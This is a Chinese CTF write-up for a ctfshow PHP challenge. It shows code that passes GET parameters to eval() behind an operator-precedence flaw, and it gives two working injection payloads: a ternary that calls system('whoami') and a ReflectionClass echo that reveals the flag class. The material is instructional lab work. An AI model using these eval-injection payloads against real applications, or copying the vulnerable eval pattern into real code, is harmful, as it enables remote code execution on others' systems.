![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202232029586.png)

>注意`=`的运算符优先级比`and`高

一道来自ctfshow的题目

```php
<?php

highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
}
```

>注意`=`的运算符优先级比`and`高

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202232030397.png)

这道题有两种解法

前置步骤都是利用运算符优先级绕过`$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);`和`if($v0)`,注意到`$v2`中不能有`;`,而`$v3`中必须要`;`

- 解法1

利用三目运算符,从而getshell

传入`v1=1&v2=md5&v3==='asdf'?0:system('whoami');`

构造eval为`md5('ctfshow')=='asdf'?0:system('whoami');`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202232022979.png)

成功getshell

- 解法2

利用反射类读取类中的信息

传入`v1=1&v2=echo new ReflectionClass&v3=;`

